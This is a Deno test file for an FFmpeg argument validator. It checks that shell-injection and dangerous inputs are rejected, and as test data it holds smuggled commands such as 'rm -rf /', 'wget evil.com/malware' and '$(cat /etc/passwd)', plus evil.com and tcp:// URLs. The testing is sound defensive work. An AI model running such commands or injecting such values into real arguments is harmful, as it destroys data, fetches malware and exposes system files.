/**
 * @license
 * This file is part of Bott.
 *
 * This project is dual-licensed:
 * - Non-commercial use: AGPLv3 (see LICENSE file for full text).
 * - Commercial use: Proprietary License (contact D@nielLaCos.se for details).
 *
 * Copyright (C) 2025 DanielLaCos.se
 */

import { assertEquals, assertThrows } from "jsr:@std/assert";
import { 
  validateFFmpegArgs, 
  FFmpegSecurityError, 
  buildSafeFFmpegArgs 
} from "./ffmpeg.ts";

Deno.test("validateFFmpegArgs - basic validation", () => {
  // Valid basic args should pass
  const validArgs = ["-i", "{{INPUT_FILE}}", "-y", "-f", "webp", "{{OUTPUT_FILE}}"];
  assertEquals(validateFFmpegArgs(validArgs), validArgs);
});

Deno.test("validateFFmpegArgs - command injection prevention", () => {
  // Shell metacharacters should fail
  assertThrows(
    () => validateFFmpegArgs(["-i", "file.txt; rm -rf /", "-f", "webp"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
  
  assertThrows(
    () => validateFFmpegArgs(["-i", "file.txt && wget evil.com/malware"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
  
  assertThrows(
    () => validateFFmpegArgs(["-i", "`rm -rf /`"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
  
  assertThrows(
    () => validateFFmpegArgs(["-i", "$(cat /etc/passwd)"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
});

Deno.test("validateFFmpegArgs - dangerous patterns", () => {
  // File system access patterns should fail
  assertThrows(
    () => validateFFmpegArgs(["-i", "/etc/passwd"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
  
  // Network access patterns should fail
  assertThrows(
    () => validateFFmpegArgs(["-i", "http://evil.com/malware"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
  
  assertThrows(
    () => validateFFmpegArgs(["-f", "tcp://badserver:1234"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
});

Deno.test("validateFFmpegArgs - null bytes", () => {
  // Null bytes should fail
  assertThrows(
    () => validateFFmpegArgs(["-i", "file\0.txt"]),
    FFmpegSecurityError,
    "null bytes"
  );
});

Deno.test("validateFFmpegArgs - excessive length", () => {
  const longArg = "a".repeat(5000);
  
  assertThrows(
    () => validateFFmpegArgs(["-i", longArg]),
    FFmpegSecurityError,
    "too long"
  );
});

Deno.test("buildSafeFFmpegArgs - template replacement", () => {
  const baseArgs = ["-i", "{{INPUT_FILE}}", "-y", "-f", "webp", "{{OUTPUT_FILE}}"];
  const inputFile = "/tmp/input.jpg";
  const outputFile = "/tmp/output.webp";
  
  const result = buildSafeFFmpegArgs(baseArgs, inputFile, outputFile);
  const expected = ["-i", "/tmp/input.jpg", "-y", "-f", "webp", "/tmp/output.webp"];
  
  assertEquals(result, expected);
});

Deno.test("buildSafeFFmpegArgs - validates base args", () => {
  const dangerousArgs = ["-i", "{{INPUT_FILE}}", "; rm -rf /"];
  
  assertThrows(
    () => buildSafeFFmpegArgs(dangerousArgs, "input.txt", "output.txt"),
    FFmpegSecurityError,
    "dangerous pattern"
  );
});